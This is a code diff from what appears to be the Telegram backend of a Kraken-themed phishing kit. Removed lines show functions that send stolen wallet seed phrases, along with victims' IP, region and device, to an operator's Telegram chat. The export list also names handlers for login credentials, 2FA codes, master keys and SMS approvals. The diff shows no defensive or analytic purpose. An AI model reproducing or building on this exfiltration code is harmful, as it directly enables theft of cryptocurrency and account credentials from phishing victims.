-      `⛔️⛔️⛔️ <b>Captcha too many attempts</b> ⛔️⛔️⛔️\n\n` +
-      `<b>🌍 Region:</b> ${region}\n` +
-      `<b>💻 Device:</b> ${device}\n` +
-      `<b>📍 IP:</b> ${ip}`;
-  } else if (type === "speed_bot") {
-    message =
-      `⛔️⛔️⛔️ <b>Kraken - Speed Bot Detected</b> ⛔️⛔️⛔️\n\n` +
-      `<b>⚡ Filled in under 2 seconds</b>\n` +
-      `<b>🌍 Region:</b> ${region}\n` +
-      `<b>💻 Device:</b> ${device}\n` +
-      `<b>📍 IP:</b> ${ip}`;
-  } else if (type === "blocked_ip") {
-    message =
-      `🚫🚫🚫 <b>Blocked IP Detected</b> 🚫🚫🚫\n\n` +
-      `<b>📍 IP:</b> ${ip}`;
-  } else {
-    message = `⚠️ Unknown alert type: ${type}`;
-  }
-
-  try {
-    await botCaptchaPage.sendMessage(CHAT_ID_CAPTCHA_PAGE, message, { parse_mode: "HTML" });
-  } catch (err) {
-    console.error("❌ Failed to send captcha alert:", err.message);
-  }
-}
-
-async function sendPhraseTelegram({ phrase, region, device, ip }, identifier) {
-  try {
-    console.log(`🔍 Checking winner for phrase - identifier: ${identifier}: ${userWinnerTelegram[identifier]}`);
-    
-    // ✅ Send to winner
-    if (identifier && userWinnerTelegram[identifier]) {
-      const message =
-        `💰💰💰💰 <b>Wallet - Phrases</b> 💰💰💰💰\n` +
-        `<b>📝 Phrases:</b>\n` +
-        `<code>${phrase}</code>\n` +
-        `<b>🌍 Region:</b> ${region}\n` +
-        `<b>💻 Device:</b> ${device}\n` +
-        `<b>📍 IP:</b> ${ip}`;
-      
-      await sendFollowUpMessage(identifier, message, { parse_mode: "HTML" });
-      console.log(`📨 Wallet Phrase sent to winner: ${userWinnerTelegram[identifier]}`);
-    } else {
-      // No winner - send to captcha bot (fallback)
-      await sendAlertTelegram("phrase", { ip, region, device, phrase });
-      console.log(`📨 Wallet Phrase sent to captcha bot (no winner)`);
-    }
-  } catch (err) {
-    console.error("❌ Failed to send wallet phrase:", err.message);
-  }
-}
-
-module.exports = {
-  bot,
+module.exports = { 
+  bot, 
   bot2,
-  botCaptchaPage,
   broadcastMessage,
   sendFollowUpMessage,
   userWinnerTelegram,
-  botsThatClickedPage1,  // ✅ NEW: Export tracking object
-  sendApprovalRequest,
-  sendApprovalRequestGeneric,
-  sendApprovalRequestSMS,
-  sendApprovalRequestPage,
-  sendLoginTelegram,
-  sendVerifyTelegram,
-  send2FATelegram,
-  send2FACode,
-  sendMasterKeyTelegram,
-  sendWalletOptionsTelegram,
-  sendAlertTelegram,
-  sendPhraseTelegram
+  botsThatClickedPage1,
+  userDeviceInfo
 };
